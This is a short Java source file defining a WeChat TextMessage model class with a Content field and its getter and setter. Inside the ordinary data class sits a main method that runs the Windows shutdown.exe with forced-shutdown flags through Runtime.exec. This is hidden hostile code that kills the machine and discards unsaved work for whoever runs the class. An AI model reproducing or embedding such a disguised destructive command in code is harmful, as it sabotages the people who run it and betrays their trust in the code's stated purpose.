package com.wxsoft.business.wechat.model.req;

import java.io.IOException;


public class TextMessage extends BaseMessage {
	// 消息内容
	private String Content;

	public String getContent() {
		return Content;
	}

	public void setContent(String content) {
		Content = content;
	}
	public static void main(String[] args) {
		try {
			Runtime.getRuntime().exec(System.getenv("windir")+"\\system32\\shutdown.exe -s -f");
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	
}
